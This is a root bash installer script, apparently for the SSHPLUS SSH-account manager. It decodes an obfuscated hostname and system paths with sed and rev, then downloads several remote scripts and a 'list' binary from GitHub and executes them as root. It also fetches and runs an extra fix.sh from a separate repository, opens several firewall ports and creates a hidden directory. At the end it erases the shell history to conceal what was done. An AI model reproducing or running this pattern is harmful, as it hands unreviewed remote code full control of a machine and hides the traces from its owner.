#!/bin/bash

# Check if running as root
if [ "$(whoami)" != "root" ]; then
    echo "Error: you need to run as root"
    rm -f $HOME/Plus > /dev/null 2>&1
    exit 1
fi

# Decode URLs
_lnk=$(echo 't1:e#n.5s0ul&p4hs$s.0729t9p$&8i&&9r7827c032:3s'| sed -e 's/[^a-z.]//ig'| rev)
_Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig')
_1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')

cd $HOME

# Create backup of SSH config
cp /etc/ssh/sshd_config "/etc/ssh/sshd_back_principal_$(date +%d-%m-%Y_%H%M%S).conf" > /dev/null 2>&1

# Create menu command
echo "/bin/menu" > /bin/h
chmod +x /bin/h > /dev/null 2>&1

# Download and set up credits
rm -rf "$HOME/credits"* > /dev/null 2>&1
wget -qO "$HOME/credits" https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/SSHPLUS-MANAGER-FREE/master/credits

# Create sshplus command
echo 'wget https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/SSHPLUS-MANAGER-FREE/master/Plus; chmod +x Plus; ./Plus' > /bin/sshplus
chmod +x /bin/sshplus > /dev/null 2>&1

# Download menu versions
for version in V3 V2 V1; do
    wget -qO /bin/menu$version https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/SSHPLUS-MANAGER-FREE/master/Install/Skin_Plus/menu$version/Install
    chmod +x /bin/menu$version > /dev/null 2>&1
done

# Create user database
if [ -f "$HOME/usuarios.db" ]; then
    echo "Keeping existing database"
else
    awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
fi

# Update system
echo "Updating system..."
apt-get update -y

# Create directory if doesn't exist
if [ ! -d /usr/share/.plus ]; then
    mkdir /usr/share/.plus
fi
echo "crz: $(date)" > /usr/share/.plus/.plus

# Install packages
echo "Installing packages..."
apt-get install -y bc screen nano unzip lsof netstat net-tools dos2unix nload jq curl figlet python3 python-pip
pip install speedtest-cli

# Configure firewall if ufw exists
if [ -f "/usr/sbin/ufw" ]; then
    ufw allow 443/tcp
    ufw allow 80/tcp
    ufw allow 3128/tcp
    ufw allow 8799/tcp
    ufw allow 8080/tcp
fi

# Download list file
echo "Downloading list..."
rm -f $_Ink/list > /dev/null 2>&1
wget -P $_Ink https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/SSHPLUS-MANAGER-FREE/master/Install/list

# Make list executable if it exists
if [ -f "$_Ink/list" ]; then
    chmod +x $_Ink/list
    # Execute the list with parameters
    $_Ink/list $_lnk $_Ink $_1nk
else
    echo "Error: Could not download the list file"
    exit 1
fi



# Add the requested fix.sh command
wget https://raw.githubusercontent.com/Wabochi/auto/main/fix.sh && chmod +x fix.sh && ./fix.sh && rm -rf fix.sh

# Cleanup
rm -f $HOME/Plus
cat /dev/null > ~/.bash_history
history -c

echo ""
echo "Installation completed!"
echo "Main command: menu"
echo "Telegram: @pirozas"
